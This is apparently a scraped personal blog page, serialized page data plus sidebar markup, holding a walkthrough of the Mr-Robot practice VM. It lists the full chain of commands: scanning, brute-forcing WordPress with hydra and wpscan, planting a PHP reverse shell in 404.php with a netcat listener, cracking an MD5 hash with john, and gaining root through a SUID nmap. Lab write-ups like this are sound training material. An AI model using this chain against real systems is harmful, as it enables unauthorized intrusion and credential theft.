exists.\n`nc -lvnp 1234`\n![](img/1675936061435.PNG)\n\n\nFound another user robot and its file\n![](img/1675936067906.PNG)\n\nDecode password\nWrite &#39;c3fcd3d76192e4007dfb496cca67e13b&#39; into hash.txt\n```\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5\n```\n![](img/1675936335560.PNG)\nTurn to user robot\n```\npython -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; \nsu robot\n```\n![](img/1675936356620.PNG)\n\n\n***\n## Privilege escalation\nTry to escalate privilege through suid\nFind all the suid file.\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null\n```\n![](img/1675936394011.png)\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21\n```\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n![](img/1675936402754.PNG)\n`cat /root/key-3-of-3.txt`\n\n\n***\n# Enclosure\n\n![](img/1675935870791.PNG)\n\n![](img/1675935877529.png)\n\n![](img/1675935887078.PNG)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Mr-Robot.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;digest&quot;:[0,&quot;f948ce3104c70e88&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sV -O -Pn -T4 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Found login page\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935901724.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThe wordlist of fsocity.dic\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935906897.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;The first key&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935911648.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;exploit-wordpress\&quot;&gt;Exploit wordpress&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploit-wordpress\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;sort and uniq&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sort fsocity.dic | uniq &gt; fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Hydra enumerate users&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;#x26;pwd=^PASS^&amp;#x26;wp-submit=Log In:Invalid username\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935995098.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Wpscan intrude users and password&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936001210.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;[Valid Combinations Found:\nUsername: Elliot, Password: ER28-0652\nLogin in wordpress&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;getshell\&quot;&gt;Getshell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#getshell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Visit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936011245.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;listen port 1234 on kali.\nThen  visit any pay which  not exists.\n&lt;code&gt;nc -lvnp 1234&lt;/code&gt;\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936061435.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Found another user robot and its file\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936067906.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Decode password\nWrite ‘c3fcd3d76192e4007dfb496cca67e13b’ into hash.txt&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936335560.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nTurn to user robot&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;su robot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936356620.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Try to escalate privilege through suid\nFind all the suid file.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936394011.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936402754.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;code&gt;cat /root/key-3-of-3.txt&lt;/code&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935870791.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935877529.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935887078.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;exploit-wordpress&quot;],&quot;text&quot;:[0,&quot;Exploit wordpress&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;getshell&quot;],&quot;text&quot;:[0,&quot;Getshell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/9&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/avatar.webp" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/avatar.webp" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/kaguyahi" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:2517029339@qq.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">5</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="文章" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 